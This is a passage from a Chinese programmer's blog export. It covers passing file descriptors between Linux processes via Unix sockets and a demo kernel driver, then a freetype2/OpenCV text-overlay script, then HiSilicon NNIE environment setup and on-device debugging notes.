	bzero(&amp;addr1, sizeof(struct sockaddr_un));

	addr.sun_family = AF_LOCAL;

	strncpy(addr.sun_path, "tmp.tmp", sizeof(addr.sun_path)-1);
	
	socklen_t addr_len = sizeof(struct sockaddr_un);

	int ret;
	if ( 0 > (ret = bind(fd, (struct sockaddr *) &amp; addr, addr_len )))&#123;

		perror("bind()");
		return -1;	
	&#125;
	
	if ( 0 > (ret = listen(fd, 3)) )&#123;
		
		perror("listen()");
		return -1;
	&#125;


	socklen_t addr1_len = sizeof(struct sockaddr_un);
	
	int ret_fd;
	if ( 0 > ( ret_fd = accept(fd, (struct sockaddr *)&amp;addr1, &amp;addr1_len)))&#123;

		perror("accept()");
		return -1;
	&#125;
	
	int open_file_fd;
	if ( 0 > (open_file_fd = open("test.txt", O_RDWR)))&#123;
		
		perror("open()");
		return -1;
	&#125;
	char file_content [100] = &#123;0x00&#125;;
	int read_bytes_num = read(open_file_fd, file_content, 99);
	printf("read file content: %s\n", file_content);


	char * flags = "@!@";
	struct iovec iov = &#123;
	
		.iov_base = flags,
		.iov_len = 3
	&#125;;
	
	union &#123;
		
		struct cmsghdr cm;
		char control[CMSG_SPACE(sizeof(int))];

	&#125;control_un;


	struct msghdr msg = &#123;
		
		.msg_name = NULL,
		.msg_namelen = 0,
		.msg_iov = &amp;iov,
		.msg_iovlen = 1,
		.msg_flags = 0,
		.msg_control = control_un.control,
		.msg_controllen = sizeof(control_un.control)
	&#125;;
	
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&amp;msg);

	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;

	*((int*)CMSG_DATA(cmsg)) = open_file_fd;


	if ( 0 > (ret = sendmsg(ret_fd, &amp;msg, 0)))&#123;
		
		perror("sendmsg()");
		return -1;
	&#125;
	close(open_file_fd);
	close(fd);
	return 0;
&#125;
  userspace_way1_recv.c
#include &lt;stdio.h>
#include &lt;sys/un.h>
#include &lt;sys/types.h>          /* See NOTES */
#include &lt;sys/socket.h>
#include &lt;unistd.h>
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
#include &lt;string.h>


int main(int argc, char * argv[])&#123;

	struct sockaddr_un addr, addr1;
	
	bzero(&amp;addr, sizeof(struct sockaddr_un));

	addr.sun_family = AF_LOCAL;

	strncpy(addr.sun_path, "tmp.tmp", sizeof(addr.sun_path)-1);
	
	socklen_t addr_len = sizeof(struct sockaddr_un);

	
	int fd = socket(AF_LOCAL, SOCK_STREAM, 0);
	if ( fd &lt; 0 ) &#123;
		
		perror("socket() error");
		return -1;	
	&#125;
	int con_ret = connect(fd, (struct sockaddr *)&amp;addr, addr_len);
	if ( con_ret &lt; 0 ) &#123;
		
		perror("connect() error");
		return -1;
	&#125;

	//char * flags = "@!@";
	char  flags[3] ;
	struct iovec iov = &#123;
	
		.iov_base = flags,
		.iov_len = 3
	&#125;;
	
	union &#123;
		
		struct cmsghdr cm;
		char control[CMSG_SPACE(sizeof(int))];

	&#125;control_un;


	struct msghdr msg = &#123;
		
		.msg_name = NULL,
		.msg_namelen = 0,
		.msg_iov = &amp;iov,
		.msg_iovlen = 1,
		.msg_flags = 0,
		.msg_control = control_un.control,
		.msg_controllen = sizeof(control_un.control)
	&#125;;

	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&amp;msg);

	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;

	*((int*)CMSG_DATA(cmsg)) = -1;
	


	int ret_recv;
	if ( 0  > (ret_recv = recvmsg(fd, &amp;msg, 0) ))&#123;

		perror("recvmsg()");
		return -1;
	&#125;

	int open_file_fd = *((int*)CMSG_DATA(cmsg));

	int ret = lseek(open_file_fd, 0, SEEK_SET);

	if ( 0 > ret )&#123;
		
		perror("lseek()");
	&#125;	



	char file_content [100] = &#123;0x00&#125;;
	int read_bytes_num;
	if ( 0 > (read_bytes_num = read(open_file_fd, file_content, 99) ))&#123;
		
		perror("read()");
		return -1;
	&#125;
	else if ( 0 == read_bytes_num )&#123;
		
		printf("read EOF\n");
	&#125;




	printf("read file content: %s, fd is %d \n", file_content, open_file_fd);



	



	
	close(open_file_fd);
	close(fd);
	return 0;
&#125;
  运行截图：(send_way1 发送，recv_way1接收，注意文件指针的重置，否则接收者打印的内容为空)

    
        
    
    


内核态实例
  建立一个trans_fd_drv驱动，然后操作驱动完成不同进程间描述符的转换。
  测试环境：


Ubuntu 18.04


Linux 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


  驱动源码
  transmisson_fd_driver.c
#include &lt;linux/init.h>
#include &lt;linux/module.h>
#include &lt;linux/kernel.h>
#include &lt;linux/cdev.h> //struct cdev
#include &lt;linux/fs.h>//struct file_operations 
#include &lt;linux/errno.h>
#include &lt;linux/device.h>
#include &lt;asm/uaccess.h>
#include &lt;linux/file.h>


static struct class * ptr_cur_class;

MODULE_LICENSE("GPL");

static struct cdev  _cur_cdev;
static dev_t _cur_dev; 



struct file * ptr_trans_file = NULL;



static int drv_open(struct inode *inode, struct file *filp)&#123;

	
	return 0;
&#125;

static int drv_release(struct inode *inode, struct file *filp)&#123;

	
	return 0;
&#125;



static long drv_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123;

	switch(cmd)&#123;
		
		case 0:&#123;//get data

			int get_fd = arg;

			ptr_trans_file = fget(get_fd);
			break;
		&#125;		
		case 1:&#123;//set data
			
			int unused_fd = get_unused_fd_flags(0);
			fd_install(unused_fd, ptr_trans_file);
			__put_user(unused_fd, (int __user *)arg);
			break;
		&#125;
		default:
			printk(KERN_ERR "drv_ioctl cmd error ......");
			break;
	&#125;
	return 0;
&#125;


static struct file_operations fops = &#123;


	.owner = THIS_MODULE,
	.open  = drv_open,
	.release = drv_release,
	.unlocked_ioctl = drv_ioctl
&#125;; 


static int __init trans_fd_drv_init(void) 
&#123; 

    printk(KERN_ERR "trans_fd_drv initing ......");


//void cdev_init(struct cdev *p, const struct file_operations *p);　
    cdev_init(&amp;_cur_cdev, &amp;fops);

//int alloc_chrdev_region(dev_t *dev, unsigned baseminor, unsigned count, const char *name);
    int ret = alloc_chrdev_region((dev_t *)&amp;_cur_dev, 0, 1, "trans_fd_drv");
    if ( ret &lt; 0 )&#123;
	
	printk(KERN_ERR "alloc_chrdev_region error");
	return -1;
    &#125;
//int cdev_add(struct cdev *p, dev_t dev, unsigned count);
    dev_t major = MAJOR(_cur_dev);
    ret = cdev_add(&amp;_cur_cdev, _cur_dev, 1);

    if ( ret &lt; 0 )&#123;
	
	printk(KERN_ERR "cdev_add error");
	return -1;
    &#125;

    ptr_cur_class = class_create(THIS_MODULE, "trans_fd_drv");
    device_create(ptr_cur_class, NULL, _cur_dev, NULL, "trans_fd_drv");


    return 0;

&#125;


static void __exit trans_fd_drv_exit(void)
&#123;

	//void device_destroy(struct class *cls, dev_t devt);
	device_destroy(ptr_cur_class, _cur_dev);

	//void class_destroy(struct class *cls); 
	class_destroy(ptr_cur_class);  

	
    //get command and pid
    printk(KERN_ERR "trans_fd_drv exiting ......");
//void unregister_chrdev_region(dev_t from, unsigned count);
    unregister_chrdev_region(_cur_dev, 1);

//void cdev_del(struct cdev *p);
    cdev_del(&amp;_cur_cdev);
&#125;

module_init(trans_fd_drv_init);
module_exit(trans_fd_drv_exit);
  操作驱动源码
  send_fd_from_drv.c
#include &lt;unistd.h>
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
int main(int argc, char * argv[])&#123;

	
	int fd;
	if ( 0 > (fd = open("/dev/trans_fd_drv", O_RDWR)) )&#123;
		
		perror("open()");
		return -1;
	&#125;
	int show_file_fd;
	if ( 0 > (show_file_fd = open("test.txt", O_RDWR)) )&#123;
		
		perror("open()");
		return -1;
	&#125;

	char file_content [100] = &#123;0x00&#125;;
	int read_bytes_num = read(show_file_fd, file_content, 99);
	printf("read file content: %s\n", file_content);


	int ret = 0;
	if ( 0 > (ret = ioctl(fd, 0, show_file_fd)) )&#123;
		
		perror("ioctl()");
		return -1;
	&#125;
	close(fd);
	close(show_file_fd);
	return 0;
&#125;
  recv_fd_from_drv.c
#include &lt;unistd.h>
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
int main(int argc, char * argv[])&#123;

	
	int fd;
	if ( 0 > (fd = open("/dev/trans_fd_drv", O_RDWR)) )&#123;
		
		perror("open()");
		return -1;
	&#125;
	int show_file_fd;
	int ret = 0;
	if ( 0 > (ret = ioctl(fd, 1, &amp;show_file_fd)) )&#123;
		
		perror("ioctl()");
		return -1;
	&#125;


	int ret = lseek(show_file_fd, 0, SEEK_SET);

	if ( 0 > ret )&#123;
		
		perror("lseek()");
		return -1;
	&#125;	


	char file_content [100] = &#123;0x00&#125;;
	int read_bytes_num = read(show_file_fd, file_content, 99);
	printf("read file content: %s\n", file_content);



	close(fd);
	close(show_file_fd);
	return 0;
&#125;
  测试截图

    
        
    
    

    
        
    
    




后记

  总结


使自己对用户态和内核态的理解更加的深刻。


通过实现一个驱动的方式来直接操作内核态内容，这是一个不错的idea。


我发现，很多时候只有亲自动手来试试，才能实际体会到成就感。


不折腾，怎么能够进步。


  注意：这里关于描述符的转换可以是任意描述符，不一定要是文件描述符（网络描述符等等都可以转换，因为linux的设计原则是：一切皆是文件。有vfs的存在，很多操作都被接口化了。）。
  如果有需求：本文所有测试代码可在这里下载（不建议下载，除了makefile我都把代码全部贴出来了的，csdn的积分我没有找到怎么编辑，默认要5分）：https://download.csdn.net/download/u011728480/11033121
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>linux kernel</tag>
        <tag>文件描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>一种OSD 简单实现 (文字反色---opencv、字体切换---freetype2(中文、空格))</title>
    <url>/2019/04/28/blog_idx_083/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

   某机器视觉项目中，往往会在一些图片上显示一些算法结果或者一些其他的文字信息来增强算法可视化或者提示演示效果。说白了，就是需要在图片上的某位置显示文字。




OSD简介

  这里的OSD是on screen display的简写，翻译过来就是在&quot;屏幕&quot;上的显示。这里的&quot;屏幕”是指在一副画面。所以，osd可以理解为在一副画面上叠加信息。




文字反色和字体切换

  文字反色：顾名思义就是根据一些条件（背景图的情况），让文字变为和之前相反的颜色。列如：黑和白。
  字体切换：字体这个东西，就是一个字显示出来是什么样子的。列如楷体、草书、宋体等等。




平均灰度和freetype2

  平均灰度：就是用opencv计算对应字体的bitmap位置的图像数据进行平均灰度计算。主要是判断这一块图像数据的亮度情况，如果过亮（白），就黑色，如果过黑，就白色。
  freetype2：这是一个开源的加载各种标准字体格式的开源框架，你可以根据你传入的字，得到对应字的bitmap。




python 实例（c++版用到项目中了，就不发了，非常类似）

  这里我就不分析了，简单注释一下，说明一下思路即可，大致就这个样子就可以实现我想要的功能。这里我强烈建议：如果做验证类的代码，python用起来是要快点，操作很方便。
  思路：


得到想要的文字的字体的bitmap


根据输入的起始位置和当前第几个字符的信息，计算出当前字要显示到对应图像坐标中的哪个块。


把对应的块截出来形成一个小图像，并计算平均灰度。


根据灰度值来决定显示黑色还是白色，主要是利用了色差，使人更显目的知道显示了什么。


from freetype import *

import numpy as np
import cv2
import math
import numpy
import matplotlib.pyplot as plt

#return bgr mat and gray mat
def GetBGRAndGrayImg(filename):
    #BGR
    img = cv2.imread(filename)
    img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    return img, img_gray

#初始化freetype2字库
freetype_face = None
def InitFreeType(path):
    global freetype_face
    freetype_face = Face(path)
    return
#设置字库你要获取的文字大小，这里的大小是一个近似值（离已有尺寸最近的尺寸）。字库里面的每个字可能存在多种尺寸。
def SetFreeTypeCharPixelSize(pixel_w, pixel_h):
    freetype_face.set_pixel_sizes( pixel_w, pixel_h )
    return
#设置字体旋转
def SetFreeTypeCharRotate(angle):
    matrix = Matrix(int((math.cos(angle)) * 0x10000), int((math.sin(angle)) * 0x10000),
                    int((math.sin(angle)) * 0x10000), int((math.cos(angle)) * 0x10000))
    freetype_face.set_transform(matrix, Vector(0, 0))
    return

#return a matrix of char, white pixel is actual font， black pixel is background of font
def GetCharMatrixFromFont(char):
    freetype_face.load_char(char)
    bitmap = freetype_face.glyph.bitmap
    return numpy.array(bitmap.buffer).reshape(bitmap.rows, bitmap.width), bitmap.width, bitmap.rows

# 下面就是根据传入的位置，文字，然后计算每个文字bitmap的矩阵对应的实际图像对应位置的区域平均灰度，决定显示什么颜色，然后进行像素替换即可。注意：这里的用的第一个字所在的下边界作为对齐的标准线。
def GetOSDImg(img, img_g, text, start_pos, interval=0):
    next_char_pos_x = start_pos[0]
    cur_pos_x = start_pos[0]
    next_char_pos_y = start_pos[1]
    cur_pos_y = start_pos[1]
    baseline_y =  start_pos[1]
    for text_i, text_e in enumerate(text):
        char_array, char_width, char_height = GetCharMatrixFromFont(text_e)
        #caculate gray
        #截出对应位置的小图像
        gray_matrix = img_g[next_char_pos_x:next_char_pos_x + char_width, next_char_pos_y:next_char_pos_y+char_height]
        #计算平均灰度
        gray_matrix_mean = gray_matrix.mean()

        if text_i == 0:
            baseline_y += char_height

        cur_pos_y = baseline_y-char_height

        for h, h_e in enumerate(char_array):
            for w, w_e in enumerate(h_e):
                if w_e == 0:
                    continue
                if gray_matrix_mean > 128:
                    #RGB
                    img[ cur_pos_y + h, cur_pos_x + w ] = [0, 0, 0]

                else:
                    #RGB
                    img[ cur_pos_y + h, cur_pos_x + w ] = [255, 255, 255]


        #caculate next char position
        cur_pos_x += char_width + interval
        #cur_pos_y += char_height
        next_char_pos_x += char_width
        next_char_pos_y += char_height
    return img
if __name__ == "__main__":

    img_t, img_g_t = GetBGRAndGrayImg("test.jpg")
    img = cv2.resize(img_t, (352, 288), interpolation=cv2.INTER_AREA)
    img_g = cv2.resize(img_g_t, (352, 288), interpolation=cv2.INTER_AREA)

    InitFreeType('mmm.ttf')
    # SetFreeTypeCharPixelSize(10, 10)
    freetype_face.set_char_size(5*64, 0, 300, 0)
    SetFreeTypeCharRotate(0)

    osd_img = GetOSDImg(img, img_g, "km/habcdefg你好吗？", np.array([50, 50]), 3)
    #plt.imshow(osd_img)
    #osd_img = osd_img.reshape(288, 352, 3)[:, :, (2, 1, 0)]

    cv2.imshow('osd', osd_img)
    cv2.waitKey(1)
    # plt.imshow(osd_img)
    plt.xticks([]), plt.yticks([])
    plt.show()


    #
    # # First pass to compute bbox
    # width, height, baseline = 0, 0, 0
    # previous = 0
    # for i, c in enumerate(text):
    #     face.load_char(c)
    #     bitmap = slot.bitmap
    #     height = max(height,
    #                  bitmap.rows + max(0,-(slot.bitmap_top-bitmap.rows)))
    #     baseline = max(baseline, max(0,-(slot.bitmap_top-bitmap.rows)))
    #     kerning = face.get_kerning(previous, c)
    #     width += (slot.advance.x >> 6) + (kerning.x >> 6)
    #     previous = c
    #
    # Z = numpy.zeros((height,37), dtype=numpy.ubyte)
    # print(Z.shape)
    # # Second pass for actual rendering
    # x, y = 0, 0
    # previous = 0
    # for c in text:
    #     face.load_char(c)
    #     bitmap = slot.bitmap
    #     top = slot.bitmap_top
    #     left = slot.bitmap_left
    #     w,h = bitmap.width, bitmap.rows
    #     y = height-baseline-top
    #     kerning = face.get_kerning(previous, c)
    #     x += (kerning.x >> 6)
    #     print(x, y ,h, w)
    #     Z[y:y+h,x:x+w] += numpy.array(bitmap.buffer, dtype='ubyte').reshape(h,w)
    #     x += (slot.advance.x >> 6)
    #     previous = c
    # print(Z.shape)
    # img = cv2.imread("test.jpg")
    # img_g = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    #
    # array = np.array(img)
    # #RGB
    # array = array.reshape(520, 520, 3)[:, :, (2, 1, 0)]
    #
    # print(array)
    #
    # array_g = np.array(img_g)
    # array_g = array_g.reshape(520, 520)
    #
    # print(array_g.shape)
    # x = 250
    # y = 250
    #
    # front_matrix = array_g[x: x + Z.shape[0], y: y+Z.shape[1] ]
    # front_matrix_mean = front_matrix.mean()
    # print(front_matrix_mean)
    # for h, h_e in enumerate(Z):
    #     for w, w_e in enumerate(h_e):
    #         if w_e == 0:
    #             continue
    #         if front_matrix_mean > 128:
    #             #R
    #             array[ x + w, y + h , 0] = 0
    #             #G
    #             array[ x + w, y + h, 1 ] = 0
    #             #B
    #             array[ x + w, y + h , 2] = 0
    #         else:
    #             #R
    #             array[ x + w, y + h , 0] = 255
    #             #G
    #             array[ x + w, y + h, 1 ] = 255
    #             #B
    #             array[ x + w, y + h , 2] = 255
    #
    # # plt.figure(figsize=(10, 10*Z.shape[0]/float(Z.shape[1])))
    # plt.imshow(array)
    # plt.xticks([]), plt.yticks([])
    # plt.show()


结果
  实际测试结果：

    
        
    
 
  字体文件打开后：

    
        
    
   




2019/7/1更新—关于C++版本中，中文支持和空格问题



中文问题
  设定freetype 为unicode解码
FT_Select_Charmap(ft_face,FT_ENCODING_UNICODE);
  用wchar_t来代替char,std::wstring 代替 std::string 。用这个wchar_t作为index去freetype查字形。
std::wstring tmp_str = L"Fu*k You!!!    \x20星星";
const char * tmp = L"Fu*k You!!!    \x20星星";


空格问题
  我发现空格在freetype中查出来是空的。长宽为0，所以需要特殊处理空格。适当的增加x轴偏移代替空格即可。


解决以上问题后效果

    
        
    
   




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>计算机视觉</category>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>opencv</tag>
        <tag>OSD</tag>
        <tag>freetype2</tag>
      </tags>
  </entry>
  <entry>
    <title>HiSi 3516CV500 NNIE(Neural Network Inference Engine) 摸鱼记录(3) ---真机调试（实例分析）</title>
    <url>/2019/06/15/blog_idx_086/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  本文建立前两篇的文章基础之上：


《HiSi 3516CV500 NNIE(Neural Network Inference Engine) 摸鱼记录(1) — 环境搭建》
https://blog.csdn.net/u011728480/article/details/91125581


《HiSi 3516CV500 NNIE(Neural Network Inference Engine) 摸鱼记录(2) — 模型生成及模型仿真(实例分析)》
https://blog.csdn.net/u011728480/article/details/91294917


  本文将会以一个实例来进行分析。hisi svp sdk的基础之上。同时本文也是本系列文章的终章。




NNIE 使用流程（其实就是读其sdk文档）



hisi svp 整体框架
vision app
--------------------
mpi(MPP Program Interface)
--------------------
driver(ko)
--------------------
nnie（hardware）
  从上述框架来说，我们要自己用的内容就是vision app 、mpi、以及nnie api
  vision app就是做图像数据的准备以及结果处理，mpi做mmz内存分配（海思特有的内存空间），nnie做forward。


相关api 简介
/*
* mpp System init
*/
HI_MPI_SYS_Exit()
HI_MPI_VB_Exit()
//设置MPP 视频缓存 池 属性 。
HI_MPI_VB_SetConfig()
HI_MPI_VB_Init()
HI_MPI_SYS_Init()
//load model
//在mmz中分配一部分内存来存放model
HI_MPI_SYS_MmzAlloc()
//从mmz内存中解析模型
HI_MPI_SVP_NNIE_LoadModel()
//NNIE  Param  Init

//forward prepare
//------------------------根据model的配置，为每一段（这里你可以简单理解为层）的forward ctrl param , src Blob, dst Blob.也就是初始化SVP_NNIE_FORWARD_CTRL_S[]，SVP_NNIE_FORWARD_WITHBBOX_CTRL_S[]，SVP_SRC_BLOB_S[]，SVP_DST_BLOB_S[]数组元素的值。
HI_MPI_SVP_NNIE_GetTskBufSize()//获取给定网络任务 各段 辅助内存
HI_MPI_SVP_NNIE_AddTskBuf()//记录TskBuf 地址 信息

//----------------给第一层送入预处理好的图片到SVP_SRC_BLOB_S

HI_MPI_SYS_MmzFlushCache()//刷新内存
HI_MPI_SVP_NNIE_Forward()//forward
HI_MPI_SVP_NNIE_Query()//查询forward任务是否完成
HI_MPI_SYS_MmzFlushCache()//刷新内存


//---------------解析HI_MPI_SVP_NNIE_Forward的参数astDst[]，得到网络的最终输出
  各种类型的forward其实hisi都已经有各个例子可以参考的。上面的总结也是我从它的例子中剥离出来的。我这里也想吐槽一下，hisi例子写的很好，就是封装的层数太多了，反而让人感觉很不爽。




NNIE 开发实例流程（其实就是参考其sample）



魔改hisi sample
  在hisi sdk中，提供了多种网络的例子，这里以我的cnn 分类网络为例。根据前文可以得到inst 的wk模型。以及一个预处理好的图片bin文件。
  找到目标文件，smp/a7_linux/mpp/sample/svp/nnie/sample/sample_nnie.c，直接复制void SAMPLE_SVP_NNIE_Cnn(void)为我的函数，修改图片bin路径和wk路径。

    
        
    
   
  作为新手，不建议去看其他的，直接改最后一部分，打印最后一层输出，直接和仿真的值进行对比。当然你熟悉后就必须自己一点点看懂，不然出错没有办法纠正。

    
        
    
   
  我这里给个demo参考例子。结果打印：

    
        
    
   
  仿真以及caffe输出值对比最后一层：

    
        
    
   
  可以发现确实是对应上了，这就证明了这个网络至少跑出来的大方向是没问题了，剩下的就是自己组织优化的问题了。


注意
  如果出现最后输出对应不上，先去检查图像输入对不对，也就是srcBlob的第一层是不是一样的，70%都是这里出问题了。
  其次再去看打印的方式对不对。
  最后看整个nnie器件你使用对不对。




后记

   总结
   要完成这个事情，需要对深度学习，嵌入式编程有一定基础才行。一般来说，都是算法出模型，嵌入式的人做这个事情，当然有兴趣的话都一起做也行。这里我想说的是这是一个学科交叉的事情，单单了解一个方向的知识都不行的。所以，一定要多沟通，才能够干好这个事情。
   其实这也是嵌入式方向的人的一个契机，当你了解一些基本的深度学习知识，而且又掌握嵌入式相关的内容，肯定是非常不错的，毕竟这是一个非常有趣的事情。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>NNIE</tag>
        <tag>3516CV500</tag>
      </tags>
  </entry>
  <entry>
    <title>HiSi 3516CV500 NNIE(Neural Network Inference Engine) 摸鱼记录(1) --- 环境搭建</title>
    <url>/2019/06/07/blog_idx_084/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  深度学习的爆发期已经到了瓶颈了，为啥这样说，因为没有突破性的理论进展，都是靠着网络更深、更广，算力更强大来做相应的功能。至少在我的世界观里面是这样的，虽然这样的认知可能会有局限性，或者说是错误的。
  现在深度学习的方向已经不是以前的泡沫鼓吹了，而是落地，踏踏实实的把实验室的东西转换为实际对社会有用的东西，这才是深度学习的现在的实际情况。
  要做相关的落地，在大部分应用场景来说，是不能够直接弄台服务器+GPU的方式来做相关的计算的，这样部署维护和成本都是一个很大的问题，现在其实大部分的场景需要的是低成本、小型化。就现在来看，其实就是移动手机平台和其他嵌入式板子平台是一个主流的方向。比如，手机端的：换脸啊、表情啊、化妆啊等等；板卡端的：依托于人脸识别的广告机啊、闸机啊等等。这里面的核心就是要在这些小型设备上做相关的算法运算。
  在这些小型设备上做运算，有一个问题就是算力的问题，这些小型设备功耗低、算力低，很可能就是算法表现比较差。还好，很多大佬在很久以前就考虑到这些问题了，出了很多硬件加速的东西。如：Nvidia的TX TK系列、瑞芯微的RK系列、HiSi的Hi3559，Hi3519，Hi3516系列以及其他的Android手机SOC里面带的相关的NPU等等。
  所以，为了把HiSi平台的相关深度学习硬件加速功能用起来，我们得把HiSi的NNIE利用起来完成这个功能。




NNIE简介

  NNIE是 Neural Network Inference Engine 的 简 称 是 海思 媒体 S oC 中 专门针对神经网络特别是深度学习卷积神经网络进行加速处理的硬件单元。----- 摘自hisi sdk svp部分《HiSVP开发指南.pdf》




NNIE 工作流程简介

  海思提供了一个NNIE Mapper的工具（Linux ， Win都有）。由于NNIE只支持Caffe框架，我们需要的是把Caffe的模型转换为NNIE可以使用的模型。
  在我们转换的时候，需要我们提供一个NNIE转换的配置文件，然后根据配置文件把相关的caffe模型转换为NNIE的模型。然后我们在板子上加载这个模型，调用相关的API就可以完成这个网络的加速计算。




NNIE 环境搭建

  工欲善其事必先利其器。NNIE最开始接触的时候，我觉得贼难受，觉得很难。但是当你把环境配置好了，你就会觉得事半功倍，很舒服。
  以下内容，我都是按照HISI SDK的SVP部分的《HI SVP开发指南.pdf》做的，只是由于时效性的原因，有些内容需要做一定的改变适应才行。
  我这里根据我的摸鱼经验，我建议萌新第一步，先把RuyiStudio配置起来，这里面带了所有和NNIE开发的工具。




RuyiStudio 简介

  以下是RuyiStudio官方介绍：
  RuyiStudio 集成 windows 版 的 NNIE mapper 和 仿真库， 具有 生成 NNIE wk 功能、 仿真NNIE 功能，同时 具有 代码 编辑、编译、调试、执行 功能 、 网络拓扑显示、目标检测画框、 向量 相似度 对比、 调试 定位 信息获取等功能 。


RuyiStudio ----- MinGW安装
  这里我建议选择手动安装，下载MinGW的对应版本，解压到一个无中文路径的目录下。然后下载对应MinGW的msys，解压到MinGW的根目录下。这里直接按照文档给的内容走即可。这一步无明显的坑。


RuyiStudio ----- Python 3.5 与CAFFE安装
  这一步是最坑的一步。所以这步我会一一按照文档介绍说明。
  这一步必须按照手动配置方式，一键脚本配置，我建议有能力的小伙伴使用，纠错有难度。


按照文档把RUYI_PYTHON_PATH环境变量添加到系统。ruyi_env_setup-2.0.28所在目录定义为PREFIX, 这里添加的值为PREFIX/python35;PREFIX/python35/Scripts;PREFIX/python35/Library/bin。这里没什么坑，就是别有中文路径就好。


然后把RUYI_PYTHON_PATH的值添加到PATH环境变量中去。没坑这里，注意按照文档整就行了。


ruyi_env_setup-2.0.28所在目录定义为PREFIX，把PREFIX/python35\Lib\site-packages\caffe\python添加到PYTHONPATH的环境变量中去。


进入ruyi_env_setup-2.0.28\python_bat目录，双击运行setup_download_python.bat。一般来说，你会报错的，因为anaconda的清华源已经被干掉了，不排除以后恢复的可能性，所以，这里又需要把清华源替换为anaconda的官方源。注意：把：setup_download_python.bat中的所有https://mirrors.tuna.tsinghua.edu.cn/anaconda连接替换为https://repo.anaconda.com/。列如：
https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/win-64/certifi-2016.2.28-py35_0.tar.bz2  替换后是 https://repo.anaconda.com/pkgs/free/win-64/certifi-2016.2.28-py35_0.tar.bz2 。这里改完了，你可以双击这个脚本setup_download_python.bat下载相关的库，这里建议开代理下载，很慢，真的。如果你以为这样就完了吗？那是不可能的。当你上述脚本执行完后，其中有9个是下载失败的。他们的连接特征如下：
https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/win-64/jpeg-9b-vc14_2.tar.bz2
来至于anaconda/cloud部分的。都不得行，so，得去官方源找对应的9个内容，我把链接地址贴到下面，可能你们需要的版本不是下面连接所示，但是你可以访问那个页面，那个页面包含所有的版本，选择对应的版本即可，
https://anaconda.org/conda-forge/jpeg/9b/download/win-64/jpeg-9b-vc14_2.tar.bz2
https://anaconda.org/conda-forge/libpng/1.6.34/download/win-64/libpng-1.6.34-vc14_0.tar.bz2
https://anaconda.org/conda-forge/libtiff/4.0.9/download/win-64/libtiff-4.0.9-vc14_0.tar.bz2
https://repo.anaconda.com/cloud/conda-forge/win-64/zlib-1.2.11-vc14_0.tar.bz2
https://anaconda.org/conda-forge/tk/8.5.19/download/win-64/tk-8.5.19-vc14_1.tar.bz2
https://anaconda.org/conda-forge/openssl/1.0.2n/download/win-64/openssl-1.0.2n-vc14_0.tar.bz2
https://anaconda.org/conda-forge/icu/58.2/download/win-64/icu-58.2-vc14_0.tar.bz2
https://anaconda.org/conda-forge/qt/5.6.2/download/win-64/qt-5.6.2-vc14_1.tar.bz2
https://anaconda.org/conda-forge/protobuf/3.5.1/download/win-64/protobuf-3.5.1-py35_vc14_0.tar.bz2
如果以上所需的内容版本发生了变动，那么访问https://anaconda.org/conda-forge/，直接去查找需要包的关键字，选择对应版本即可，如：jpeg ，搜索了后，选择	排名第一的conda-forge / jpeg 9c源，然后进去选择对应版本下载即可。这个网站有点卡，建议代理。如下图：



    
        
    
   
  所有的内容下载好了 ，开始下一步。


把上面下载的包放到ruyi_env_setup-2.0.28\python35目录下，并全部解压到ruyi_env_setup-2.0.28\python35目录。


把ruyi_env_setup-2.0.28 目录下的caffe.zip 放到ruyi_env_setup-2.0.28\python35\Lib\site-packages下解压。


把opencv_python-3.4.0.12-cp35-cp35m-win_amd64.whl放到ruyi_env_setup-2.0.28\python35\Lib\site-packages ,然后在ruyi_env_setup-2.0.28\python35\Lib\site-packages目录，执行pip install opencv_python-3.4.0.12-cp35-cp35m-win_amd64.whl安装opencv




RuyiStudio-2.0.28.zip 解压运行
  打开RuyiStudio.exe得到如下的界面，常用的几个点就如图所示，至于怎么完成后续工作。请看后续文章。

    
        
    
   




后记

  无
参考文献


无







    
        
